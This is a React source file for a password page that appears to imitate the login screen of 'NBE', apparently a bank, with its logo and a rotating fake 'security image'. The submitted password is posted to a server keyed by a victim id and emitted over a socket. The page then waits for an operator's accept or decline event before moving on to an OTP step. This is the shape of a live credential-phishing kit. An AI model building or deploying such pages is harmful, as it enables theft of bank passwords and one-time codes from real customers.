import axios from "axios";
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { useLanguage } from "../hooks/useLanguage";
import { useAdminApproval } from "../hooks/useAdminApproval";
import LanguageToggle from "../components/nbe/LanguageToggle";
import BackButton from "../components/nbe/BackButton";
import ForgotLink from "../components/nbe/ForgotLink";
import LoginButtonRow from "../components/nbe/LoginButtonRow";
import ProcessingOverlay from "../components/nbe/ProcessingOverlay";
import DeclineError from "../components/nbe/DeclineError";
import OutlinedInput from "../components/nbe/OutlinedInput";
import { id } from "./Home";

const SECURITY_IMAGES = ["/img3.jpeg", "/img4.jpeg"];
const SECURITY_IMAGE_KEY = "nbe-security-img-last";
let pendingSecurityImage = null;

function pickSecurityImage() {
  if (pendingSecurityImage) {
    const image = pendingSecurityImage;
    pendingSecurityImage = null;
    return image;
  }

  const last = sessionStorage.getItem(SECURITY_IMAGE_KEY);
  const nextIndex = last === "0" ? 1 : 0;
  const image = SECURITY_IMAGES[nextIndex];
  sessionStorage.setItem(SECURITY_IMAGE_KEY, String(nextIndex));
  pendingSecurityImage = image;
  return image;
}

const Password = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState("");
  const [securityImage] = useState(pickSecurityImage);
  const { t, dir } = useLanguage();
  const { waiting, setWaiting, clearError, declineMessage } = useAdminApproval({
    orderId: id,
    acceptEvent: "acceptUser",
    declineEvent: "declineUser",
    declineMessageKey: "declinePassword",
    onAccept: () => navigate("/otp"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    clearError();
    setWaiting(true);
    try {
      await axios
        .post(api_route + "/password/" + id, { password })
        .then(({ data }) => {
          socket.emit("password", data);
        });
    } catch (err) {
      console.log(err);
      setWaiting(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-white flex flex-col items-center">
      {waiting && <ProcessingOverlay />}
      <form
        className="w-full max-w-md mx-auto px-4 pb-6 flex flex-col"
        onSubmit={handleSubmit}
      >
        <div className="w-full flex items-center justify-between">
          <BackButton />
          <LanguageToggle compact />
        </div>

        <div className="flex flex-col items-center gap-6 mt-20">
          <img src="/img1.png" alt="NBE Logo" className="w-1/2" />
          <div className="flex flex-col items-center gap-2">
            <img
              src={securityImage}
              alt={t("securityPhrase")}
              className="w-1/2 border-2 border-nbe-green rounded-lg"
            />
            <span className="text-zinc-800 text-sm lowercase">
              {t("securityPhrase")}
            </span>
          </div>
        </div>

        <div className="w-full flex flex-col mt-10">
          <OutlinedInput
            type="password"
            required
            dir={dir}
            label={t("password")}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="mb-2"
          />
          <ForgotLink>{t("forgotPassword")}</ForgotLink>

          <LoginButtonRow loading={waiting} label={t("login")} />

          <DeclineError message={declineMessage} />
        </div>
      </form>
    </div>
  );
};

export default Password;
